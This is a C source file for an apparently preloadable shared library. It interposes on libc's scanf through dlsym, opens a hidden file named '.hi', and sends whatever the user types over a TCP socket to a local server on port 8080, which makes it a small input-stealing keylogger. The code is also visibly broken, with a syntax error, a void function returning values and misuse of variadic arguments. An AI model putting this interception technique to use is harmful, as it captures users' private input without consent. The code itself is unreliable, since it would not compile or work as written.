#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#define PORT 8080

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"

typedef int (*sym)(const char *, ...);
void* handle;
FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit() 
{
	fd = fopen(HIDDEN_FILE,"w");
    handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

void mydest() 
{
    dlclose(handle);
    fclose(fd);
}

int scanf ( const char * format, ... )
{
	char* itr = format;
	unsigned int val_hex;
	int has_val = 0;
	sym orig_scanf;

	orig_scanf = (sym)dlsym(handle,"scanf");
	va_list arg;
	va_start(arg, format);
    orig_scanf(format, arg);
	char* p = arg;
	while (p != "\0")
	{
		printf(format, p);
		++p;
	}
	
	printf("\n";
    sendToServer(arg);


	return 0;
}



void sendToServer(va_list arg)
{
	int sock = 0, valread;
	struct sockaddr_in serv_addr;
	// va_list arg;
	// va_start(arg, format);
	char buffer[1024] = {0};
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		printf("\n Socket creation error \n");
		return -1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);
	
	// Convert IPv4 and IPv6 addresses from text to binary form
	if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)
	{
		printf("\nInvalid address/ Address not supported \n");
		return -1;
	}

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	{
		printf("\nConnection Failed \n");
		return -1;
	}
	send(sock , arg , strlen(arg) , 0 );
	
	
}
